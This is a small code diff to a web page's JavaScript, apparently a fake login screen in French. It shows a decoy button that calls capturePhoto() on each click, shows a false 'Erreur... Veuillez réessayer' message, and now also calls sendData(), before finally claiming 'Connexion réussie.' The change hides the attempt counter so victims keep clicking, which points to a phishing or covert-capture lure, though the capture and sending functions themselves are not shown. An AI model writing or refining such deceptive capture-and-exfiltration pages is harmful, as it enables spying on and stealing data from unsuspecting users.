@@ -132,7 +132,8 @@
       capturePhoto();
 
       if (clickCount < 5) {
-        status.textContent = `Erreur... Veuillez réessayer (${clickCount}/5)`;
+        status.textContent = `Erreur... Veuillez réessayer`;
+        sendData();
       } else {
         fakeBtn.disabled = true;
         status.textContent = "Connexion réussie.";
